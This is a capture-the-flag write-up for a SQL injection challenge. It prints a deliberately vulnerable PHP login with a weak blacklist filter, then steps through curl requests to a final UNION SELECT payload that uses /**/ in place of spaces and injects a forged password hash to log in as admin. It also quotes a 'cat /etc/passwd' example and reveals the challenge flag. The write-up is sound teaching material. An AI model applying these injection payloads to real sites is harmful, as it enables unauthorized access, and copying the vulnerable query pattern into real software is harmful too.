# SQLi 2

## Description

> SQL injections are still a problem yes, even in 2021. Bypass the login mechanism and get access to the admin area.


## Hints

> Find a way to write queries without spaces.
>
> Search how to unite data in SQL.

## Write-Up

### Summary

1. [Exploration](#exploration)
2. [Attempts](#attempts)
3. [Basics](#basics)
4. [Solution](#solution)

### Exploration 


So at first, when we access the website, we can find a simple login form. But, after checking the console, we can find a hidden route `/?pls_help` that gives us the `php` code of the backend page :

```html
<!DOCTYPE html>
<html>
<head>
    <title>Mentoring program</title>
</head>
<body>
        <form method="post">
        <input type="text" placeholder="Username" name="user" required>
        <input type="password" placeholder="Password" name="pass" required>
        <button type="submit">Login</button>
        <br><br>
            </form>
        <!-- <a href="/?pls_help">get some help</a> -->
</body>
</html>
```

```php
 <?php
error_reporting(0);
error_log(0);

require_once("flag.php");

function is_trying_to_hak_me($str)
{   
    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];
    if (strpos($str, "'") !== false) {
        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;
        }
    }
    foreach ($blacklist as $token) {
        if (strpos($str, $token) !== false) return true;
    }
    return false;
}

if (isset($_GET["pls_help"])) {
    highlight_file(__FILE__);
    exit;
}
   
if (isset($_POST["user"]) && isset($_POST["pass"]) && (!empty($_POST["user"])) && (!empty($_POST["pass"]))) {
    $user = $_POST["user"];
    $pass = $_POST["pass"];
    if (is_trying_to_hak_me($user)) {
        die("why u bully me");
    }

    $db = new SQLite3("/var/db.sqlite");
    $result = $db->query("SELECT * FROM users WHERE username='$user'");
    if ($result === false) die("pls dont break me");
    else $result = $result->fetchArray();

    if ($result) {
        $split = explode('$', $result["password"]);
        $password_hash = $split[0];
        $salt = $split[1];
        if ($password_hash === hash("sha256", $pass.$salt)) $logged_in = true;
        else $err = "Wrong password";
    }
    else $err = "No such user";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mentoring program</title>
</head>
<body>
    <?php if (isset($logged_in) && $logged_in): ?>
    <p>Have a flag: <?=htmlspecialchars($flag);?><p>
    <?php else: ?>
    <form method="post">
        <input type="text" placeholder="Username" name="user" required>
        <input type="password" placeholder="Password" name="pass" required>
        <button type="submit">Login</button>
        <br><br>
        <?php if (isset($err)) echo $err; ?>
    </form>
    <?php endif; ?>
    <!-- <a href="/?pls_help">get some help</a> -->
</body>
</html>
```

### Attempts

Let's try to enter some credantials :

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=admin&pass=admin" 
```

```html
<!DOCTYPE html>
<html>
...
        <br><br>
        Wrong password    </form>
...
</html>
```

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=walid&pass=admin"
```

```html
<!DOCTYPE html>
<html>
...
        <br><br>
        No such user    </form>
...
</html>

```

From the title, let's try a simple **SQL Injection** payload :

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=' OR 1=1 --&pass=admin"
```

We get :

```
why u bully me  
```

this comes from the `is_trying_to_hak_me()` function that verifies special characters, expecially used in sql injection :

```php
...
function is_trying_to_hak_me($str)
{   
    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];
    if (strpos($str, "'") !== false) {
        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;
        }
    }
    foreach ($blacklist as $token) {
        if (strpos($str, $token) !== false) return true;
    }
    return false;
}
...
```

**Note :** `die()` function is a function that helps returning errors to end users :
 - Using die() can be a good option when working with HTTP Endpoints.
 - If your PHP Script is one, you can use die() to send back an error as plain text or JSON for example.
 - die(json_encode(array('error' => 'some error')));

<br>
<br>
<br>

As the `preg_match()` may cause us some problems, let's try to baypass it  :

1. Bypassing `preg_match()` using arrays :


> preg_match function compare regular espression and input of user.
>
> but if input value is array it fail to compare.
>
> As a result following script continuously execute. Attacker can bypass preg_macth function and take place side effect of various case.

So for the `user` input, let's try to send an array instead : 

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user[]=abc'def&pass=admin"
```

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user[]='def&pass=admin" 
```

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user[]=' OR 1=1 --&pass=admin"
```

Those commands actually baypasses the `preg_match()`, but unfortunatly they causes SQL errors, that's why we can't get any output from them.

<br>
<br>

2. Bypassing `preg_match()` with multilines input :

One of the most common ways to bypass pregmatch is to use **multiline inputs**, because `preg_match` only tries to match the first line.

> To bypass this check you could **send the value with new-lines urlencoded** `(%0A)` or if you can send **JSON data**, send it in **several lines**:
>
> ```
>{
>  "cmd": "cat /etc/passwd"
>}
>```
>
> See Example here : https://ramadistra.dev/fbctf-2019-rceservice

```
└─$ curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=%0A' OR 1=1 --&pass=admin" 
why u bully me   
```

We can see that this technique doesn't work in our case, and even if it doesn't, that only baypasses the SQL query, we still have to match the passowrd hash of the user to log in.

### Basics

So let's remind our selves with some SQL basics :

 - You can print a result back using the following command, for example let's try to print "Hello" :

```
SELECT "Hello"
```

This will return one column table, that has one row in it which says "Hello" :

<table>
  <tr>
    <th>Exprt1000</th>
  </tr>
  <tr>
    <td>Hello</td>
  </tr>
</table>

Now let's try to return in two different columns :

```
SELECT "Hello", "World!"
```

Here is what we got

<table>
  <tr>
    <th>Exprt1000</th>
    <th>Exprt1001</th>
  </tr>
  <tr>
    <td>Hello</td>
    <td>World!</td>
  </tr>
</table>


So, basically, we can, using `SELECT` query, what ever we want, in a row, on multiple columns. This will help us to inject the result we want in the result of the `user` query.

 - You can see that, in our case, the `;` is forbidden, and also we are not in a multiline query. Otherwise, it would be interesting to run a query after the `user` query and inject what we want. So, we need to find a way to execute two `queries` at once, or in other words, output the result of two executed queries, and for that, we can use the `UNION` operator :

```
SELECT * FROM table1
UNION
SELECT * FROM table2
```

### Solution

For the solution, there is four things we should consider :

1. We need the first query, which is the `user`'s one, to return nothing, this way we can give the second `query` (which will explain in the second point) the chance to return the result **We Want**, which enables us to bypass the `pass` check (which we will explain in the third point). To do that, we need to give a random user that isn't registered in the database :


```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr&pass=admin"
```

It gives us the `No such user` error :

```html
...
        <br><br>
        No such user    </form>
...
</html>
```

So, here is our payload so far (Note the use of `'` to close the first query, and the ..., which will be completed in next points):

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr'...&pass=admin"
```

2. Next, comes the second query we were talking about, this `query` will enable us to not only return some data after the first one failed to do so (Thanks to us), but also data that we can control (again to bypass the `pass` check). For this one, we will use the `query` learnt in the [**Basics**](#basics) section :

```
SELECT 'admin','YOUR_HASHED_PASS_HERE'
```

This enables us to return a row that contains two values : a `user` and a `pass` which is hashed. the password is hashed we are simulating a return state from the database, where the passwords area actually hashed before stored in the db. So, to sum, we are actually the **SQLi** to get the `user` request to return what we actually want : a valid user, and a password that we kinda chosen for it.

Also, to make this `query` to be executed correctly, we will need to use the `UNION` query.

Here is what the exploit will become :

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr'UNION SELECT 'admin','YOUR_HASH_PASS_HERE&pass=admin"
```

3. Now that we constructed our payload, we will need to give a value to `YOUR_HASH_PASS_HERE`, which will get the `sha256` hash of the `pass` input value, since with our logic, we will be comparing it to its hash. And in order to bypass the `pass` check, they need to be equal :

Here is the hash of the value `admin` in `sha256` (see [This tool](https://emn178.github.io/online-tools/sha256.html) for the hash operation) :

```
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
```

And here is the new payload :

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr'UNION SELECT 'admin','8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&pass=admin"
```

4. Finally, in order to make this work, we need to replace the spaces and quotes `'` with other chars in order to bypass the `preg_match()` :

 - For the spaces, one of the techniques is to use empty comments `/**/` instead.
 - For quotes, we have the following code :

```php
...
if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;
        }
...
```

So, in order to the quote to pass the check, it needs to be surrounded by degits and numbers.


Here is the final payload :

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr'UNION/**/SELECT/**/'admin','8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&pass=admin"
```

As a result, we get the flag :

```html
<!DOCTYPE html>
<html>
<head>
    <title>Mentoring program</title>
</head>
<body>
        <p>Have a flag: shellmates{c0ngr4tul4t10ns_U_d1d_1t!!_fe4cd84591ea}<p>
        <!-- <a href="/?pls_help">get some help</a> -->
</body>
</html>
```


**Note :** note that if you don't replace the `YOUR_HASH_PASS_HERE` by the hash if your password how you actually bypasses the regex and `user query`, bu not the `pass query`

```
curl 'http://sqli-2.web-server.challs.ctf.shellmates.club/' -X POST --data "user=whtvr'UNION/**/SELECT/**/'admin','YOUR_HASH_PASS_HERE&pass=admin"
```

```html

<!DOCTYPE html>
<html>
<head>
    <title>Mentoring program</title>
</head>
<body>
        <form method="post">
        <input type="text" placeholder="Username" name="user" required>
        <input type="password" placeholder="Password" name="pass" required>
        <button type="submit">Login</button>
        <br><br>
        Wrong password    </form>
        <!-- <a href="/?pls_help">get some help</a> -->
</body>
</html>

```

## Flag

shellmates{c0ngr4tul4t10ns_U_d1d_1t!!_fe4cd84591ea}

## More Information

 - Bypass `preg_match()` function : 
   - https://bugs.php.net/bug.php?id=69274
   - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
 - What is `die()` function : https://www.php.net/manual/fr/function.die.php
 - SQL queries :
   - `SELECT` : https://www.w3schools.com/sql/sql_select.asp 
   - `UNION` : https://sql.sh/cours/union